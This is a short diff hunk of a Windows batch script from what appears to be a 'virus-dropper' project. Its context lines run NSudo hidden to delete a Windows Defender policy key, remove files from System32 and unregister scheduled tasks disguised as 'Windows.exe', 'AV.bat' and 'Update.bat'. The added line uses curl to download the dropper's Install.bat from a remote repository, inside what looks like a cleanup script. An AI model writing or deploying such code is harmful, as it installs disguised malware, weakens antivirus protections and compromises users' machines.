@@ -14,6 +14,7 @@ del "%systemroot%\System32\Windowsexe\Update.bat"
 rd "%systemroot%\System32\Windowsexe"
 NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
 del NSudo.exe
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Install.bat" --output "Install.bat"
 powershell -Command "Unregister-ScheduledTask -TaskName 'Windows.exe' -Confirm:$false"
 powershell -Command "Unregister-ScheduledTask -TaskName 'AV.bat' -Confirm:$false"
 powershell -Command "Unregister-ScheduledTask -TaskName 'Update.bat' -Confirm:$false"
